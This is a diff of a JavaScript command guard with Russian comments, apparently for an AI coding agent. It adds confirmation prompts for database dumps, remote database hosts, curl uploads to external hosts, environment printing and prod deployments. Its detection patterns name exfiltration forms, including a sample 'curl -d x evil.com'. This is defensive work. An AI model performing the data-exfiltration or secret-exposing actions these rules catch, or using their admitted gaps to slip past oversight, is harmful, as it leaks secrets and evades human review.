@@ -1,10 +1,11 @@
 // Гард безопасности — общее ядро. Отвечает на один вопрос: этот вызов может
-// утечь секретом или опубликовать работу?
+// утечь секретом, выгрузить данные, тронуть прод или отправить что-то наружу?
 //
 // Два уровня ответа, и разница принципиальна:
 //   deny — законной причины нет, и есть безопасная альтернатива (секреты);
-//   ask  — только push: единственная точка, где человек смотрит, что уходит
-//          наружу. Остальное идёт без вопроса — так решил пользователь.
+//   ask  — операция законная, но необратимая или раскрывает данные: push,
+//          прод, удалённый хост, дамп или внешняя БД, curl с телом, печать
+//          окружения. Обратимое (amend, --no-verify, правка харнеса) идёт молча.
 //
 // Разбор нарочно грубый — распознаются формы, а не синтаксис shell. Всё
 // нераспознанное проходит: задача не поймать любой обход, а закрыть удобный
@@ -92,9 +93,45 @@ export function findSecretValue(text) {
 }
 
 // ---------------------------------------------------------------------------
-// Push.
+// База данных: выгрузка целиком и обращение к неместному хосту.
+
+const DUMP_CMDS = new Set(['pg_dump', 'pg_dumpall', 'mysqldump', 'mongodump', 'pgbackrest']);
+const DB_CLIENTS = new Set(['psql', 'mysql', 'mongosh', 'mongo', 'redis-cli', 'clickhouse-client']);
+const LOCAL_HOST_RE = /^(localhost|127\.0\.0\.1|::1|0\.0\.0\.0|host\.docker\.internal|db|postgres|mysql|redis)$/i;
+
+function hostsIn(seg, toks) {
+  const hosts = [];
+  for (let i = 0; i < toks.length; i++) {
+    const t = toks[i];
+    if (t === '-h' || t === '--host') { if (toks[i + 1]) hosts.push(toks[i + 1]); }
+    else if (/^--host=/.test(t)) hosts.push(t.split('=')[1]);
+  }
+  for (const m of String(seg).matchAll(/\b\w+:\/\/(?:[^\s/@]*@)?([\w.-]+)/g)) hosts.push(m[1]);
+  return hosts.filter(Boolean);
+}
+
+// Переменные окружения, из которых клиент берёт хост.
+const DB_HOST_ENV_RE = /(?:^|[\s;&|(])(?:PGHOST|MYSQL_HOST)=["']?([\w.-]+)/g;
+
+// Хост клиента БД: кроме общих форм — слитный `-hHOST` (mysql, psql), строка
+// подключения psql `host=…` и переменная окружения. Переменную ищем по всей
+// команде: `export PGHOST=prod; psql app` задаёт её в соседнем сегменте.
+function dbHostsIn(raw, seg, toks) {
+  const hosts = hostsIn(seg, toks);
+  for (const t of toks) {
+    const joined = t.match(/^-h([^-].*)$/);
+    if (joined) hosts.push(joined[1]);
+    for (const m of t.matchAll(/(?:^|\s)host(?:addr)?=([\w.-]+)/g)) hosts.push(m[1]);
+  }
+  for (const m of String(raw).matchAll(DB_HOST_ENV_RE)) hosts.push(m[1]);
+  return hosts;
+}
+
+// ---------------------------------------------------------------------------
+// Ветки и деплой.
 
 const PROTECTED_BRANCH_RE = /^(main|master|dev|develop|prod|production|release(\/.*)?)$/i;
+const PROD_TOKEN_RE = /(^|[^a-z])prod(uction)?([^a-z]|$)/i;
 
 // Опции push с отдельным аргументом: без них `-o ci.skip origin` считал
 // remote-ом `ci.skip`, а `origin` — веткой.
@@ -140,13 +177,46 @@ function gitPushReason(toks, at) {
 }
 
 // ---------------------------------------------------------------------------
-// Тело запроса curl/wget: с секретным файлом в нём — запрет (readsSecret).
+// Отправка данных наружу: curl/wget с телом запроса или загрузкой файла.
 
 // curl — `-d`, `-F`, `-T`, `--data*`, `--json`; wget — `--post-*`, `--body-*`.
 // Короткие бывают слитными (`-dfoo`, `-d@file`), длинные — через `=`.
 const UPLOAD_FLAG_RE = /^(-[dFT]|--(data[\w-]*|form[\w-]*|upload-file|json|post-(data|file)|body-(data|file)))(=|$)|^-[dFT]./;
+const FROM_FILE_FLAG_RE = /^(-T|--upload-file|--(post|body)-file)/;
 
 const hasUploadFlag = (toks) => toks.some((t) => UPLOAD_FLAG_RE.test(t));
+
+// Опции curl/wget с отдельным аргументом: их аргумент — не адрес.
+const OUTBOUND_ARG_OPTS = new Set(['-d', '--data', '--data-raw', '--data-binary', '--data-urlencode',
+  '--data-ascii', '-F', '--form', '--form-string', '-T', '--upload-file', '--json', '-H', '--header',
+  '-X', '--request', '-o', '--output', '-u', '--user', '-A', '--user-agent', '-e', '--referer',
+  '-b', '--cookie', '-c', '--cookie-jar', '-K', '--config', '-x', '--proxy', '-w', '--write-out',
+  '-m', '--max-time', '--connect-timeout', '--retry', '-r', '--range', '-E', '--cert', '--key',
+  '--cacert', '--resolve', '--post-data', '--post-file', '--body-data', '--body-file', '--method',
+  '-U', '-P', '--directory-prefix']);
+
+// Адрес без схемы (`curl -d x evil.com`) — свободный аргумент команды. Хост —
+// его начало до порта или пути.
+function bareHosts(toks) {
+  const hosts = [];
+  for (let i = commandIndex(toks) + 1; i < toks.length; i++) {
+    const t = toks[i];
+    if (OUTBOUND_ARG_OPTS.has(t)) { i++; continue; }
+    // Перенаправления (`2>&1`, `>out.json`) и `\` переноса строки — не адреса.
+    if (/^(-|@|\d*[<>]|\\$)/.test(t) || t.includes('://')) continue;
+    hosts.push(t.replace(/^[^@/]*@/, '').split(/[/:?]/)[0]);
+  }
+  return hosts;
+}
+
+function outboundReason(toks, seg) {
+  if (!hasUploadFlag(toks)) return null;
+  const hosts = [...hostsIn(seg, toks), ...bareHosts(toks)];
+  const external = hosts.filter((h) => h && !LOCAL_HOST_RE.test(h));
+  if (external.length === 0) return null;
+  const fromFile = /[@<]\s*[\w./-]+/.test(seg) || toks.some((t) => FROM_FILE_FLAG_RE.test(t));
+  return `отправка данных на ${external[0]}${fromFile ? ' с содержимым файла' : ''}`;
+}
 
 // ---------------------------------------------------------------------------
 // Читает ли команда секрет. Именно чтение опасно: прочитанное остаётся в
@@ -478,9 +548,12 @@ function gitFileOperands(toks, at) {
 }
 
 // Секрет по имени или по цели симлинка; путь, вычисляемый при запуске
-// (`-F "$f"`, `-F $(…)`), в команде не виден и проходит.
+// (`-F "$f"`, `-F $(…)`), в команде не виден — решает человек.
 function gitFileVerdict(toks, at) {
   for (const file of gitFileOperands(toks, at)) {
+    if (/[$`]/.test(file)) {
+      return { level: ASK, reason: `git читает файл \`${file}\`: путь вычисляется при запуске, в команде его не видно.` };
+    }
     if (isSecretPath(file)) return secretReason(file);
     const real = resolveReal(file);
     if (isSecretPath(real)) return secretReason(`${file}\` → \`${real}`);
@@ -546,6 +619,46 @@ function nestedReadsFile(nested) {
   return nested.some((c) => READS_FILE.has(baseCommand(commandName(tokenize(c)))));
 }
 
+// Команда печатает окружение целиком: голый `env` (и за обёрткой — `sudo env`),
+// `printenv` без имени, `set`, `export -p`, `declare -x`, программа jq с `env`
+// или `$ENV` целиком (`env`, `[env]`, `$ENV | keys`), а не с одной переменной
+// (`env.HOME`, `$ENV["HOME"]`); ключ `.env`, переменная `$env` и строка `"env"` —
+// не окружение. Имя команды или null.
+const JQ_ENV_RE = /(?<![\w."$])(?:\$ENV|env)(?![\w"]|\s*[.[])/g;
+
+// `{env, x}` и `{env: …}` — ключ объекта (`{env}` = `{env: .env}`), а не окружение:
+// слева `{` или `,` внутри фигурных скобок, справа `,`, `}` или `:`.
+function jqObjectKey(program, at, len) {
+  if (!/^\s*[,}:]/.test(program.slice(at + len))) return false;
+  const before = program.slice(0, at).trimEnd();
+  if (before.endsWith('{')) return true;
+  if (!before.endsWith(',')) return false;
+  const open = [];
+  for (const ch of before) {
+    if ('{[('.includes(ch)) open.push(ch);
+    else if ('}])'.includes(ch)) open.pop();
+  }
+  return open[open.length - 1] === '{';
+}
+
+function jqPrintsEnv(program) {
+  const s = String(program ?? '');
+  return [...s.matchAll(JQ_ENV_RE)].some((m) => m[0] === '$ENV' || !jqObjectKey(s, m.index, m[0].length));
+}
+
+function printsEnv(toks) {
+  const at = commandIndex(toks);
+  const cmd = path.basename(toks[at] || '');
+  const rest = toks.slice(at + 1);
+  // `env` — обёртка: без команды после него он печатает окружение.
+  if (!cmd) return toks.some((t) => path.basename(t) === 'env') ? 'env' : null;
+  if (cmd === 'printenv' && rest.every((t) => t.startsWith('-'))) return cmd;
+  if (cmd === 'set' && rest.length === 0) return cmd;
+  if (['export', 'declare', 'typeset'].includes(cmd) && rest.every((t) => /^-[px]+$/.test(t))) return cmd;
+  if (cmd === 'jq' && jqPrintsEnv(jqArgs(toks).program)) return cmd;
+  return null;
+}
+
 export function guardBashSecurity(command, depth = 0) {
   const raw = String(command || '');
   if (!raw.trim() || depth > 3) return null;
@@ -553,6 +666,16 @@ export function guardBashSecurity(command, depth = 0) {
   for (const { text: seg, piped } of segments(raw)) {
     const toks = tokenize(seg);
     const cmd = baseCommand(commandName(toks));
+
+    // До отсева пустого cmd: голый `env` — обёртка без команды, имя у него пустое.
+    const envCmd = printsEnv(toks);
+    if (envCmd) {
+      return {
+        level: ASK,
+        reason: `\`${envCmd}\` печатает всё окружение. Нужна одна переменная — назови её явно.`,
+      };
+    }
+
     if (!cmd) continue;
 
     // Вложенные команды разбираем до всего остального: обёртка сама по себе
@@ -605,6 +728,35 @@ export function guardBashSecurity(command, depth = 0) {
       };
     }
 
+    // Команды, печатающие окружение целиком. Секрет в них приходит не из
+    // файла, а из вывода, и по имени файла его не поймать: `printenv` в
+    // проекте с экспортированным токеном кладёт его в транскрипт так же
+    // надёжно, как `cat .env`.
+    if (/^docker(-compose)?$/.test(cmd) && toks.includes('config') && !toks.includes('--services')) {
+      return {
+        level: ASK,
+        reason: '`docker compose config` печатает конфиг с подставленными секретами. Список сервисов — `--services`.',
+      };
+    }
+
+    if (DUMP_CMDS.has(cmd)) {
+      return { level: ASK, reason: `\`${cmd}\` выгружает базу целиком.` };
+    }
+
+    if (DB_CLIENTS.has(cmd)) {
+      const external = dbHostsIn(raw, seg, toks).filter((h) => !LOCAL_HOST_RE.test(h));
+      if (external.length) {
+        return { level: ASK, reason: `\`${cmd}\` идёт на внешний хост ${external[0]} — возможно, боевая база.` };
+      }
+      if (/\.dump\b|--rdb\b|COPY\s+.*\bTO\b/i.test(seg)) {
+        return { level: ASK, reason: `\`${cmd}\` выгружает содержимое базы.` };
+      }
+    }
+
+    if (cmd === 'sqlite3' && /\.dump\b/.test(seg)) {
+      return { level: ASK, reason: 'sqlite3 .dump выгружает базу целиком.' };
+    }
+
     if (cmd === 'git') {
       const at = gitSubcommandAt(toks);
       const fileVerdict = gitFileVerdict(toks, at);
@@ -614,6 +766,27 @@ export function guardBashSecurity(command, depth = 0) {
         if (reason) return { level: ASK, reason };
       }
     }
+
+    if (cmd === 'docker' || cmd === 'docker-compose') {
+      const acts = ['up', 'down', 'restart', 'stack', 'push'];
+      if (toks.some((t) => acts.includes(t)) && PROD_TOKEN_RE.test(seg)) {
+        return { level: ASK, reason: 'docker меняет прод-конфигурацию.' };
+      }
+    }
+
+    if (cmd === 'kubectl' && toks.some((t) => ['apply', 'delete', 'scale', 'rollout', 'patch'].includes(t))) {
+      return { level: ASK, reason: 'kubectl меняет состояние кластера.' };
+    }
+
+    if (cmd === 'ssh' && /\b(systemctl|docker|rm|deploy|migrate)\b/.test(seg)) {
+      return { level: ASK, reason: 'команда меняет состояние удалённого хоста.' };
+    }
+
+    if (cmd === 'curl' || cmd === 'wget' || cmd === 'http' || cmd === 'httpie') {
+      const reason = outboundReason(toks, seg);
+      if (reason) return { level: ASK, reason };
+    }
+
   }
   return null;
 }
